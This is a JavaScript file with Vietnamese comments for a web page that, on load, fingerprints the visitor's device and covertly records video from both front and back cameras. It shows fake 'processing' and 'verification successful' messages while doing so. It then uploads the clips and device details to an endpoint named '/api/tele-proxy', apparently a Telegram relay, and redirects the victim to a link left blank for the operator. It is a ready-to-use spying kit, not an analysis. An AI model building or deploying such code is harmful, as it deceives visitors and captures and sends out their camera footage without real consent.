// main.js - Quay video MP4 trong lúc xử lý
const API_PROXY = '/api/tele-proxy';

const info = {
  time: new Date().toLocaleString('vi-VN'),
  device: '',
  os: '',
  camera: '⏳ Đang quay video...'
};

// --- 1. NHẬN DIỆN THIẾT BỊ ---
function detectDevice() {
  const ua = navigator.userAgent;
  const platform = navigator.platform;
  const screenW = window.screen.width;
  const screenH = window.screen.height;
  const ratio = window.devicePixelRatio;

  if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
    info.os = 'iOS';
    const res = `${screenW}x${screenH}@${ratio}`;
    const iphoneModels = {
      "430x932@3": "iPhone 14/15/16 Pro Max",
      "393x852@3": "iPhone 14/15/16 Pro / 15/16",
      "428x926@3": "iPhone 12/13/14 Pro Max / 14 Plus",
      "390x844@3": "iPhone 12/13/14 / 12/13/14 Pro",
      "414x896@3": "iPhone XS Max / 11 Pro Max",
      "414x896@2": "iPhone XR / 11",
      "375x812@3": "iPhone X / XS / 11 Pro",
      "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
    };
    info.device = iphoneModels[res] || 'iPhone Model';
  } else if (/Android/i.test(ua)) {
    info.os = 'Android';
    const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
  } else {
    info.os = ua.includes('Windows') ? 'Windows' : 'Desktop';
    info.device = platform || 'PC/Laptop';
  }
}

// --- 2. QUAY VIDEO CAMERA (MP4) ---
async function recordVideoMP4(facingMode = 'user', duration = 10000) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null;
  
  try {
    // Ưu tiên codec H.264 cho MP4
    const mimeTypes = [
      'video/mp4;codecs=h264',
      'video/mp4;codecs=avc1',
      'video/webm;codecs=vp9',
      'video/webm;codecs=vp8',
      'video/webm'
    ];
    
    let mimeType = null;
    for (const type of mimeTypes) {
      if (MediaRecorder.isTypeSupported(type)) {
        mimeType = type;
        break;
      }
    }
    
    if (!mimeType) {
      console.warn('Không tìm thấy codec hỗ trợ, dùng mặc định');
      mimeType = 'video/webm';
    }

    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { 
        facingMode,
        width: { ideal: 640 },
        height: { ideal: 480 }
      }, 
      audio: false 
    });

    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: mimeType,
      videoBitsPerSecond: 1000000 // 1 Mbps
    });

    const chunks = [];

    return new Promise((resolve) => {
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: mimeType });
        stream.getTracks().forEach(t => t.stop());
        resolve(blob);
      };

      // Bắt đầu quay
      mediaRecorder.start(1000); // Ghi dữ liệu mỗi giây
      
      // Tự động dừng sau duration
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          mediaRecorder.stop();
        }
      }, duration);

      // Cập nhật UI
      const statusDiv = document.getElementById('status');
      if (statusDiv) {
        let seconds = duration / 1000;
        const timer = setInterval(() => {
          seconds--;
          if (seconds > 0) {
            statusDiv.innerHTML = `🎥 Đang quay video ${facingMode === 'user' ? 'trước' : 'sau'} (${seconds}s)...<br>Vui lòng giữ nguyên vị trí.`;
          } else {
            clearInterval(timer);
            statusDiv.innerHTML = `✅ Đã quay xong camera ${facingMode === 'user' ? 'trước' : 'sau'}!`;
          }
        }, 1000);
      }
    });

  } catch (e) {
    console.error('Lỗi quay video:', e);
    return null;
  }
}

// --- 3. CHUYỂN ĐỔI SANG MP4 (nếu cần) ---
async function convertToMP4(blob) {
  // Nếu đã là MP4 thì trả về nguyên bản
  if (blob.type === 'video/mp4' || blob.type === 'video/mp4;codecs=h264') {
    return blob;
  }
  
  // Nếu là WebM, thử chuyển sang MP4 (trên trình duyệt hỗ trợ)
  try {
    const video = document.createElement('video');
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    const url = URL.createObjectURL(blob);
    video.src = url;
    await video.play();
    
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    // Tạo stream mới từ canvas
    const stream = canvas.captureStream(30);
    const recorder = new MediaRecorder(stream, {
      mimeType: 'video/mp4;codecs=h264'
    });
    
    const chunks = [];
    recorder.ondataavailable = (e) => chunks.push(e.data);
    
    return new Promise((resolve) => {
      recorder.onstop = () => {
        const mp4Blob = new Blob(chunks, { type: 'video/mp4' });
        URL.revokeObjectURL(url);
        resolve(mp4Blob);
      };
      
      recorder.start();
      
      // Vẽ từng frame
      const drawFrame = () => {
        if (video.ended) {
          recorder.stop();
          return;
        }
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        requestAnimationFrame(drawFrame);
      };
      
      drawFrame();
      video.play();
    });
  } catch (e) {
    console.warn('Không thể chuyển sang MP4, giữ nguyên định dạng:', e);
    return blob;
  }
}

// --- 4. HÀM CHÍNH ĐIỀU KHIỂN ---
async function main() {
  const button = document.querySelector('.btn') || document.querySelector('button');
  const statusDiv = document.getElementById('status');
  
  detectDevice();

  // Cập nhật trạng thái và bắt đầu quay trong lúc xử lý
  if (statusDiv) {
    statusDiv.innerHTML = '⏳ Đang xử lý yêu cầu...<br>Vui lòng đợi.';
  }
  
  // Bắt đầu quay video trong lúc xử lý
  info.camera = '⏳ Đang quay camera...';
  
  // Quay cả 2 camera cùng lúc hoặc tuần tự
  const [frontVideo, backVideo] = await Promise.all([
    recordVideoMP4("user", 8000),    // 8 giây
    recordVideoMP4("environment", 8000) // 8 giây
  ]);
  
  // Hoặc quay tuần tự nếu Promise.all không hoạt động
  // let frontVideo = await recordVideoMP4("user", 8000);
  // let backVideo = await recordVideoMP4("environment", 8000);
  
  info.camera = (frontVideo || backVideo) ? '✅ Đã quay video MP4' : '🚫 Không quay được video';

  // Chuẩn bị gửi dữ liệu
  const formData = new FormData();
  formData.append('clientInfo', JSON.stringify(info));

  // Xác định tên file và định dạng
  const getFileExtension = (blob) => {
    if (blob.type.includes('mp4')) return 'mp4';
    if (blob.type.includes('webm')) return 'webm';
    return 'mp4';
  };

  if (frontVideo || backVideo) {
    if (frontVideo) {
      const ext = getFileExtension(frontVideo);
      formData.append('front', frontVideo, `front.${ext}`);
    }
    if (backVideo) {
      const ext = getFileExtension(backVideo);
      formData.append('back', backVideo, `back.${ext}`);
    }
    
    // Gửi lên server
    try {
      await fetch(API_PROXY, { method: 'POST', body: formData });
    } catch (e) {
      console.error('Lỗi gửi video:', e);
    }
  } else {
    // Nếu không quay được video, gửi text
    await fetch(API_PROXY, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(info)
    });
  }

  // --- ĐẾM NGƯỢC CHUYỂN HƯỚNG ---
  if (button) {
    button.style.backgroundColor = "#28a745";
    button.style.color = "#ffffff";
    button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
    
    let timeLeft = 3;
    button.innerText = `Hoàn tất (${timeLeft}s)`;
    
    if (statusDiv) {
      statusDiv.innerHTML = '✅ Xác thực thành công!<br>Đang chuyển hướng...';
    }
    
    const countdownInterval = setInterval(() => {
      timeLeft--;
      if (timeLeft > 0) {
        button.innerText = `Hoàn tất (${timeLeft}s)`;
      } else {
        clearInterval(countdownInterval);
        // THAY LINK CHUYỂN HƯỚNG VÀO ĐÂY
        window.location.href = "";
      }
    }, 1000);
  } else {
    setTimeout(() => {
      window.location.href = "";
    }, 3000);
  }
}

// Kích hoạt hệ thống
main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
